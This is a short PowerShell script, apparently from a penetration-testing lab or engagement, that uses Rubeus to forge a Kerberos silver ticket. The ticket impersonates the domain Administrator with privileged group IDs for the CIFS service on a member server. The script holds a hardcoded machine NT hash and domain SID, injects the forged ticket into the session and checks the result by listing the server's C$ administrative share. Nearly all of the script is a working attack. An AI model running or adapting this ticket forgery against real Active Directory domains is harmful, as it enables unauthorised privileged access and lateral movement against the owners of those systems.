# WT011/012 debug: Rubeus help + corrected silver (admin user) with full output
$ErrorActionPreference = 'Continue'
$Rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$childSid = 'S-1-5-21-2616196951-1941128886-767624593'
$mbr01Nt = '3a01c6cd54eab57a78377d0ef10cef3f'
$dc = 'dc02.child.cadre.local'

Write-Output '===== RUBEUS SILVER HELP ====='
& $Rubeus silver /help 2>&1 | Select-Object -First 40 | ForEach-Object { Write-Output "HELP_SILVER|$_" }

Write-Output '===== RUBEUS DIAMOND HELP ====='
& $Rubeus diamond /help 2>&1 | Select-Object -First 40 | ForEach-Object { Write-Output "HELP_DIAMOND|$_" }

Write-Output '===== WT011 SILVER (Administrator, admin groups) FULL ====='
klist purge 2>&1 | Out-Null
& $Rubeus silver /service:cifs/mbr01.child.cadre.local /rc4:$mbr01Nt /sid:$childSid /user:Administrator /id:500 /group:512,513,518,519,520 /domain:child.cadre.local /ptt 2>&1 | ForEach-Object { Write-Output "SILVER|$_" }
Write-Output '--- SMB VERIFY ---'
cmd.exe /c "dir \\mbr01.child.cadre.local\c$ 2>&1" | Select-Object -First 10 | ForEach-Object { Write-Output "SILVER_SMB|$_" }
klist 2>&1 | Select-String -Pattern 'cifs|mbr01|Server' | Select-Object -First 6 | ForEach-Object { Write-Output "SILVER_KERB|$_" }
klist purge 2>&1 | Out-Null
Write-Output 'DEBUG_DONE'
